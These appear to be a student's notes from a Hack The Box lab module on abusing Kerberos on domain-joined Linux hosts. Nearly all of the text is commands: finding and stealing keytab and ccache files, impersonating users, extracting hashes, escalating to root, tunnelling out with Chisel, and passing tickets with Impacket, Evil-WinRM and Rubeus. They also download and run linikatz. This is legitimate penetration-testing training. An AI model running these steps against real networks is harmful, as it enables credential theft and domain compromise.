## Kerberos on Linux
#### Linux auth from MS01
![[Pasted image 20260511141653.png]]
#### Linux auth via port forward

```shell
3kjS@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```
## Identifying Linux and Active Directory integration
#### realm - Check if Linux machine is domain-joined

```shell
david@inlanefreight.htb@linux01:~$ realm list
```
#### PS - Check if Linux machine is domain-joined

```shell
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
```
## Finding Kerberos tickets in Linux
## Finding KeyTab files
#### Using Find to search for files with keytab in the name

```shell
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
```
#### Identifying KeyTab files in Cronjobs

```shell
carlos@inlanefreight.htb@linux01:~$ crontab -l
# Edit this file to introduce tasks to be run by cron. 
# 
...SNIP... 
# 
# m h dom mon dow command 
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh 
carlos@inlanefreight.htb@linux01:~$ cat 
/home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh 
#!/bin/bash 

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```
## Finding ccache files
#### Reviewing environment variables for ccache files.

```shell
david@inlanefreight.htb@linux01:~$ env | grep -i krb5 

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```
#### Searching for ccache files in /tmp

```shell
david@inlanefreight.htb@linux01:~$ ls -la /tmp
```
## Abusing KeyTab files
#### Listing KeyTab file information

```shell
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab
```
#### Impersonating a user with a KeyTab

```shell
david@inlanefreight.htb@linux01:~$ klist

david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

david@inlanefreight.htb@linux01:~$ klist
```
#### Connecting to SMB Share as Carlos

```shell
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
```
### KeyTab Extract
#### Extracting KeyTab hashes with KeyTabExtract

```shell
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
#### Log in as Carlos

```shell
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb

carlos@inlanefreight.htb@linux01:~$ klist
```
## Abusing KeyTab ccache
#### Privilege escalation to root

```shell
3kjS@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l

svc_workstations@inlanefreight.htb@linux01:~$ sudo su root@linux01:/home/svc_workstations@inlanefreight.htb# whoami root
```
## Using Linux attack tools with Kerberos
#### Host file modified

```shell
3kjS@htb[/htb]$ cat /etc/hosts
```
#### Proxychains configuration file

```shell
3kjS@htb[/htb]$ cat /etc/proxychains.conf
```
#### Download Chisel to our attack host

```shell
3kjS@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz 

3kjS@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz 

3kjS@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel 3kjS@htb[/htb]$ sudo ./chisel server --reverse
```
#### Connect to MS01 with xfreerdp

```shell
3kjS@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```
#### Execute chisel from MS01

```cmd
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
**Note:** The client IP is your attack host IP.
#### Setting the KRB5CCNAME environment variable

```shell
3kjS@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
### Impacket
#### Using Impacket with proxychains and Kerberos authentication

```shell
3kjS@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
```
### Evil-WinRM
#### Installing Kerberos authentication package

```shell
3kjS@htb[/htb]$ sudo apt-get install krb5-user -y
```
#### Default Kerberos v5 realm
![[Pasted image 20260511142852.png]]
#### Administrative server for your Kerberos realm
![[Pasted image 20260511142900.png]]
#### Kerberos configuration file for INLANEFREIGHT.HTB

```shell
3kjS@htb[/htb]$ cat /etc/krb5.conf
```
#### Using Evil-WinRM with Kerberos

```shell
3kjS@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
## Miscellaneous
If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
#### Impacket Ticket converter

```shell
3kjS@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
#### Importing converted ticket into Windows session with Rubeus

```cmd
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```
## Linikatz
#### Linikatz download and execution

```shell
3kjS@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh 
3kjS@htb[/htb]$ /opt/linikatz.sh
```